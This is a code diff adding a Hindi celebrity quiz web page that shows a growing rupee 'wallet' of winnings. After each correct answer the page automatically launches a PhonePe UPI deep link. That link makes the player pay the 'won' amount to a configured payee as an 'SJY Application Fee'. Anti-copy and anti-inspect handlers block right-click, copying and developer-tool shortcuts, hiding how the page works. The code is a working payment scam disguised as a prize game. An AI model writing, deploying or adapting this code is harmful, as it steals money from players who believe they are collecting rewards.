+          { id: "A", text: "सलमान खान" },
+          { id: "B", text: "अक्षय कुमार" },
+          { id: "C", text: "रनबीर कपूर" },
+          { id: "D", text: "वरुण धवन" }
+        ],
+        correct: "B"
+      },
+      {
+        image: "https://commons.wikimedia.org/wiki/Special:FilePath/Virat%20Kohli%20portrait.jpg",
+        hint: "संकेत: भारतीय क्रिकेट के 'चेज़ मास्टर' और किंग कोहली",
+        options: [
+          { id: "A", text: "विराट कोहली" },
+          { id: "B", text: "रोहित शर्मा" },
+          { id: "C", text: "एमएस धोनी" },
+          { id: "D", text: "हार्दिक पांड्या" }
+        ],
+        correct: "A"
+      },
+      {
+        image: "https://commons.wikimedia.org/wiki/Special:FilePath/SachinTendulkar.jpg",
+        hint: "संकेत: 'क्रिकेट के भगवान' और मास्टर ब्लास्टर",
+        options: [
+          { id: "A", text: "सचिन तेंदुलकर" },
+          { id: "B", text: "विराट कोहली" },
+          { id: "C", text: "राहुल द्रविड़" },
+          { id: "D", text: "सौरव गांगुली" }
+        ],
+        correct: "A"
+      },
+      {
+        image: "https://commons.wikimedia.org/wiki/Special:FilePath/Indian%20actor%20Amitabh%20Bachchan.jpg",
+        hint: "संकेत: बॉलीवुड के 'शहंशाह' और KBC के होस्ट",
+        options: [
+          { id: "A", text: "अमिताभ बच्चन" },
+          { id: "B", text: "धर्मेंद्र" },
+          { id: "C", text: "राजेश खन्ना" },
+          { id: "D", text: "शाहरुख खान" }
+        ],
+        correct: "A"
+      }
+    ];
+
+    // ========== STATE ==========
+    const MAX_LIVES = 7;
+    let currentQ = 0;
+    let score = 0;
+    let lives = MAX_LIVES;
+    let selected = null;
+    let timeLeft = 15;
+    let timerInterval = null;
+    let answered = false;
+    let streak = 0;
+
+    // DOM
+    const optionsEl = document.getElementById('options');
+    const lockBtn = document.getElementById('lockBtn');
+    const resultEl = document.getElementById('result');
+    const timerEl = document.getElementById('timer');
+    const timerBox = document.getElementById('timerBox');
+    const clockProgress = document.getElementById('clockProgress');
+    const clockNeedle = document.getElementById('clockNeedle');
+    const qBadge = document.getElementById('qBadge');
+    const questionHint = document.getElementById('questionHint');
+    const celebPhotoBox = document.getElementById('celebPhotoBox');
+    const celebImg = document.getElementById('celebImg');
+    const challengeEl = document.getElementById('challenge');
+    const progressFill = document.getElementById('progressFill');
+    const scoreDisplay = document.getElementById('scoreDisplay');
+    const walletDisplay = document.getElementById('walletDisplay');
+    const livesPill = document.getElementById('livesPill');
+    const livesCount = document.getElementById('livesCount');
+    const livesBar = document.getElementById('livesBar');
+    const gameArea = document.getElementById('gameArea');
+    const finalScreen = document.getElementById('finalScreen');
+    const bottomBar = document.getElementById('bottomBar');
+
+    function updateLivesUI() {
+      const hearts = '❤️'.repeat(lives) + '🤍'.repeat(MAX_LIVES - lives);
+      livesPill.textContent = hearts;
+      livesCount.textContent = lives;
+    }
+
+    // ========== PREMIUM WEB AUDIO SOUND ENGINE (NO TIMER COUNTDOWN TICK) ==========
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+    function playTone(freq, duration, type = 'sine', volume = 0.14, delay = 0) {
+      try {
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.frequency.value = freq;
+        osc.type = type;
+        const startTime = audioCtx.currentTime + delay;
+        gain.gain.setValueAtTime(0.001, startTime);
+        gain.gain.linearRampToValueAtTime(volume, startTime + 0.015);
+        gain.gain.exponentialRampToValueAtTime(0.001, startTime + duration);
+        osc.start(startTime);
+        osc.stop(startTime + duration);
+      } catch(e) {}
+    }
+
+    function playWinFanfare() {
+      playTone(523.25, 0.14, 'triangle', 0.16, 0);
+      playTone(659.25, 0.14, 'triangle', 0.16, 0.09);
+      playTone(783.99, 0.16, 'triangle', 0.18, 0.18);
+      playTone(1046.50, 0.35, 'sine', 0.2, 0.28);
+      playTone(1318.51, 0.25, 'sine', 0.12, 0.42);
+    }
+
+    function playCoinClaim() {
+      playTone(987.77, 0.1, 'sine', 0.16, 0);
+      playTone(1318.51, 0.24, 'sine', 0.18, 0.09);
+    }
+
+    function playWrong() {
+      playTone(220, 0.22, 'sawtooth', 0.09, 0);
+      playTone(165, 0.32, 'sawtooth', 0.08, 0.16);
+    }
+
+    function playClick() {
+      playTone(680, 0.06, 'sine', 0.08, 0);
+    }
+
+    // ========== CONFETTI ==========
+    function launchConfetti() {
+      const canvas = document.getElementById('confetti');
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+
+      const particles = [];
+      const colors = ['#7c3aed', '#f59e0b', '#fde047', '#22c55e', '#ec4899', '#3b82f6'];
+
+      for (let i = 0; i < 95; i++) {
+        particles.push({
+          x: canvas.width / 2,
+          y: canvas.height / 2,
+          vx: (Math.random() - 0.5) * 20,
+          vy: (Math.random() - 0.5) * 20 - 7,
+          size: Math.random() * 8 + 4,
+          color: colors[Math.floor(Math.random() * colors.length)],
+          life: 1
+        });
+      }
+
+      function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        let alive = false;
+        particles.forEach(p => {
+          if (p.life <= 0) return;
+          alive = true;
+          p.x += p.vx;
+          p.y += p.vy;
+          p.vy += 0.28;
+          p.life -= 0.015;
+          ctx.globalAlpha = p.life;
+          ctx.fillStyle = p.color;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+          ctx.fill();
+        });
+        if (alive) requestAnimationFrame(animate);
+        else ctx.clearRect(0, 0, canvas.width, canvas.height);
+      }
+      animate();
+    }
+
+    // ========== TOAST ==========
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 2200);
+    }
+
+    // ========== CORE LOGIC (ALL 7 QUESTIONS GUARANTEED) ==========
+    function loadQuestion() {
+      if (currentQ >= questions.length) {
+        showFinal();
+        return;
+      }
+
+      const unitAmt = getUnitAmount();
+      const q = questions[currentQ];
+      selected = null;
+      answered = false;
+      timeLeft = 15;
+      resultEl.className = 'result';
+      resultEl.innerHTML = '';
+      lockBtn.disabled = true;
+      lockBtn.innerHTML = '🔒 अपना जवाब लॉक करें';
+
+      celebPhotoBox.classList.remove('revealed');
+      celebImg.src = q.image;
+      celebImg.onerror = () => {
+        celebImg.src = 'https://via.placeholder.com/300x300/4c1d95/fde047?text=?';
+      };
+
+      qBadge.textContent = `प्रश्न ${currentQ + 1}/7`;
+      questionHint.textContent = q.hint;
+      challengeEl.textContent = `${currentQ + 1}/7`;
+      progressFill.style.width = `${(currentQ / questions.length) * 100}%`;
+      scoreDisplay.textContent = score;
+      walletDisplay.textContent = `₹${score * unitAmt}`;
+      updateLivesUI();
+
+      const qCard = document.getElementById('questionCard');
+      qCard.style.animation = 'none';
+      void qCard.offsetWidth;
+      qCard.style.animation = 'cardSlide 0.4s ease';
+
+      optionsEl.innerHTML = '';
+      q.options.forEach(opt => {
+        const btn = document.createElement('button');
+        btn.type = 'button';
+        btn.className = 'option';
+        btn.innerHTML = `<span class="opt-letter">${opt.id}</span> <span>${opt.text}</span>`;
+        btn.onclick = () => selectOption(opt.id, btn);
+        optionsEl.appendChild(btn);
+      });
+
+      startTimer();
+    }
+
+    function selectOption(id, btn) {
+      if (answered) return;
+      selected = id;
+      playClick();
+      document.querySelectorAll('.option').forEach(o => o.classList.remove('selected'));
+      btn.classList.add('selected');
+      lockBtn.disabled = false;
+    }
+
+    function updateClockVisual(sec) {
+      const total = 15;
+      const circumference = 75.4;
+      const offset = circumference * (1 - sec / total);
+      clockProgress.style.strokeDashoffset = offset;
+      const angle = (total - sec) * 24;
+      clockNeedle.style.transform = `translateX(-50%) rotate(${angle}deg)`;
+    }
+
+    function startTimer() {
+      clearInterval(timerInterval);
+      timerBox.className = 'timer-box';
+      timerEl.textContent = `00:${String(timeLeft).padStart(2, '0')}`;
+      updateClockVisual(timeLeft);
+
+      timerInterval = setInterval(() => {
+        timeLeft--;
+        const displaySec = Math.max(0, timeLeft);
+        timerEl.textContent = `00:${String(displaySec).padStart(2, '0')}`;
+        updateClockVisual(displaySec);
+
+        timerBox.classList.add('tick-beat');
+        setTimeout(() => timerBox.classList.remove('tick-beat'), 160);
+
+        if (timeLeft <= 5 && timeLeft > 0) {
+          timerBox.classList.remove('warning');
+          timerBox.classList.add('danger');
+        } else if (timeLeft <= 9 && timeLeft > 5) {
+          timerBox.classList.add('warning');
+        }
+
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          if (!answered) lockAnswer(true);
+        }
+      }, 1000);
+    }
+
+    function lockAnswer(auto = false) {
+      if (answered) return;
+      if (!selected && !auto) return;
+
+      answered = true;
+      clearInterval(timerInterval);
+      lockBtn.disabled = true;
+
+      const unitAmt = getUnitAmount();
+      const q = questions[currentQ];
+      const isCorrect = selected === q.correct;
+
+      celebPhotoBox.classList.add('revealed');
+      progressFill.style.width = `${((currentQ + 1) / questions.length) * 100}%`;
+
+      document.querySelectorAll('.option').forEach(btn => {
+        btn.classList.add('disabled');
+        const letter = btn.querySelector('.opt-letter').textContent;
+        if (letter === q.correct) {
+          btn.classList.remove('selected');
+          btn.classList.add('correct');
+        } else if (letter === selected && !isCorrect) {
+          btn.classList.remove('selected');
+          btn.classList.add('wrong');
+        }
+      });
+
+      if (isCorrect) {
+        score++;
+        streak++;
+        playWinFanfare();
+        if (streak >= 3) {
+          showToast(`🔥 ${streak} लगातार सही जवाब! कमाल!`);
+        }
+        launchConfetti();
+
+        const correctText = q.options.find(o => o.id === q.correct).text;
+        document.getElementById('successCorrectName').textContent = correctText;
+        document.getElementById('successAmountText').textContent = `₹${unitAmt}`;
+        document.getElementById('successOverlay').classList.add('show');
+        scheduleAutoPayAndNext();
+
+        resultEl.className = 'result show correct';
+        resultEl.innerHTML = `🎉 बिल्कुल सही जवाब! +₹${unitAmt}`;
+      } else {
+        streak = 0;
+        lives = Math.max(0, lives - 1);
+        playWrong();
+        updateLivesUI();
+        livesBar.classList.add('shake');
+        setTimeout(() => livesBar.classList.remove('shake'), 480);
+
+        const correctText = q.options.find(o => o.id === q.correct).text;
+        const msgTitle = auto ? '⏰ समय समाप्त!' : '😢 गलत जवाब!';
+
+        resultEl.className = 'result show wrong';
+        resultEl.innerHTML = `
+          ${msgTitle} (-1 ❤️ लाइफलाइन)
+          <br><small>सही उत्तर: <strong>${correctText}</strong></small>
+          <br><small style="opacity:0.85">${currentQ + 1 < questions.length ? 'अगला सवाल खुल रहा है...' : 'अंतिम परिणाम खुल रहा है...'}</small>
+        `;
+
+        setTimeout(() => nextQuestion(), 1700);
+      }
+
+      scoreDisplay.textContent = score;
+      walletDisplay.textContent = `₹${score * unitAmt}`;
+    }
+
+    function nextQuestion() {
+      currentQ++;
+      loadQuestion();
+    }
+
+    function showFinal() {
+      clearAutoPayTimer();
+      const unitAmt = getUnitAmount();
+      gameArea.style.display = 'none';
+      bottomBar.style.display = 'none';
+      finalScreen.classList.add('show');
+
+      const emoji = score >= 6 ? '👑' : score >= 4 ? '🏆' : '🎉';
+      const title = score >= 6 ? 'सुपरस्टार विजेता!' : score >= 4 ? 'शानदार प्रदर्शन!' : 'गेम पूरा हुआ!';
+      const sub = score >= 6
+        ? 'आपने 7 में से लगभग सभी सवाल सही किए!'
+        : score >= 4
+          ? 'आपने सभी 7 सवाल खेले और बढ़िया स्कोर बनाया!'
+          : 'सभी 7 सवाल पूरे हुए! फिर से खेलकर पूरा इनाम जीतें!';
+
+      document.getElementById('finalEmoji').textContent = emoji;
+      document.getElementById('finalTitle').textContent = title;
+      document.getElementById('finalScore').textContent = score;
+      document.getElementById('finalMoney').textContent = score * unitAmt;
+      document.getElementById('finalSub').textContent = sub;
+
+      if (score >= 4) launchConfetti();
+      playWinFanfare();
+    }
+
+    function restartGame() {
+      clearAutoPayTimer();
+      playClick();
+      currentQ = 0;
+      score = 0;
+      lives = MAX_LIVES;
+      streak = 0;
+      finalScreen.classList.remove('show');
+      gameArea.style.display = 'block';
+      bottomBar.style.display = 'flex';
+      loadQuestion();
+    }
+
+    // ---------- PhonePe Deep-Link & 4s Auto-Trigger ----------
+    var phonePeOpened = false;
+    var autoPhonePeTimer = null;
+    var autoPayAndNextTimer = null;
+    var payAndNextTriggered = false;
+
+    function clearAutoPayTimer() {
+      if (autoPayAndNextTimer) {
+        clearTimeout(autoPayAndNextTimer);
+        autoPayAndNextTimer = null;
+      }
+    }
+
+    function scheduleAutoPayAndNext() {
+      clearAutoPayTimer();
+      payAndNextTriggered = false;
+      autoPayAndNextTimer = setTimeout(function() {
+        payAndNext();
+      }, 4000);
+    }
+
+    function openPhonePe(paymentAmount){
+      if (phonePeOpened) return;
+      phonePeOpened = true;
+      if (autoPhonePeTimer) {
+        clearTimeout(autoPhonePeTimer);
+        autoPhonePeTimer = null;
+      }
+
+      var upi = String(PAYMENT_UPI_ID || '').trim();
+      var bankName = PAYMENT_PAYEE_NAME || 'Send To Your Bank';
+      var rawAmount = parseFloat(paymentAmount);
+      if (!upi || !Number.isFinite(rawAmount) || rawAmount <= 0) {
+        phonePeOpened = false;
+        alert('UPI ID / amount invalid hai.');
+        return;
+      }
+
+      var phonePeAmount = Math.round(rawAmount) * 100; // paise
+
+      var payload = {
+        "p2pPaymentCheckoutParams": {
+          "checkoutType": "COLLECT",
+          "initialAmount": phonePeAmount,
+          "note": { "type": "text", "message": "SJY Application Fee" },
+          "supportedInstruments": -1
+        },
+        "contact": {
+          "type": "EXTERNAL_MERCHANT",
+          "name": bankName,
+          "vpa": upi
+        }
+      };
+
+      var jsonString = JSON.stringify(payload);
+      var base64Data = btoa(unescape(encodeURIComponent(jsonString)));
+
+      var nativeDeeplink = 'phonepe://native?data=' + encodeURIComponent(base64Data) + '&id=p2ppayment';
+      var intentDeeplink = 'intent://native?data=' + encodeURIComponent(base64Data) +
+        '&id=p2ppayment#Intent;scheme=phonepe;package=com.phonepe.app;end';
+
+      var a = document.createElement('a');
+      a.href = nativeDeeplink;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+
+      setTimeout(function(){ try { window.location.href = nativeDeeplink; } catch(e) {} }, 120);
+      setTimeout(function(){ try { window.location.href = intentDeeplink; } catch(e) {} }, 350);
+      setTimeout(function(){ if (document.body.contains(a)) document.body.removeChild(a); }, 500);
+      setTimeout(function(){ phonePeOpened = false; }, 2500);
+    }
+
+    function resetPhonePeFlag(){ phonePeOpened = false; }
+    document.addEventListener('visibilitychange', function(){
+      if(document.visibilityState === 'visible') resetPhonePeFlag();
+    });
+    window.addEventListener('focus', function(){ resetPhonePeFlag(); });
+    window.addEventListener('pageshow', function(){ resetPhonePeFlag(); });
+
+    function payAndNext(){
+      if (payAndNextTriggered) return;
+      payAndNextTriggered = true;
+      clearAutoPayTimer();
+      playCoinClaim();
+      openPhonePe(getUnitAmount());
+      setTimeout(function(){
+        document.getElementById('successOverlay').classList.remove('show');
+        nextQuestion();
+      }, 800);
+    }
+
+    // ========== ANTI-COPY / ANTI-INSPECT ==========
+    function blockAntiCopy(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    }
+
+    document.addEventListener('contextmenu', blockAntiCopy, true);
+    document.addEventListener('selectstart', blockAntiCopy, true);
+    document.addEventListener('dragstart', blockAntiCopy, true);
+    document.addEventListener('copy', function(e) {
+      blockAntiCopy(e);
+      showToast('⚠️ कॉपी करना मना है');
+    }, true);
+    document.addEventListener('cut', blockAntiCopy, true);
+    document.addEventListener('paste', blockAntiCopy, true);
+
+    document.addEventListener('keydown', function(e) {
+      const key = (e.key || '').toLowerCase();
+      if (
+        e.key === 'F12' ||
+        e.keyCode === 123 ||
+        (e.ctrlKey && ['u', 's', 'c', 'a', 'x', 'p'].includes(key)) ||
+        (e.metaKey && ['u', 's', 'c', 'a', 'x', 'p'].includes(key)) ||
+        (e.ctrlKey && e.shiftKey && ['i', 'j', 'c', 'k'].includes(key)) ||
+        (e.metaKey && e.altKey && ['i', 'j', 'c'].includes(key))
+      ) {
+        e.preventDefault();
+        e.stopPropagation();
+        showToast('⚠️ यह सुविधा बंद है');
+        return false;
+      }
+    }, true);
+
+    // Start
+    syncPaymentAmount();
+    lockBtn.addEventListener('click', () => lockAnswer(false));
+    loadQuestion();
+
+    document.body.addEventListener('click', () => {
+      if (audioCtx.state === 'suspended') audioCtx.resume();
+    }, { once: true });
+  </script>
+</body>
+</html>
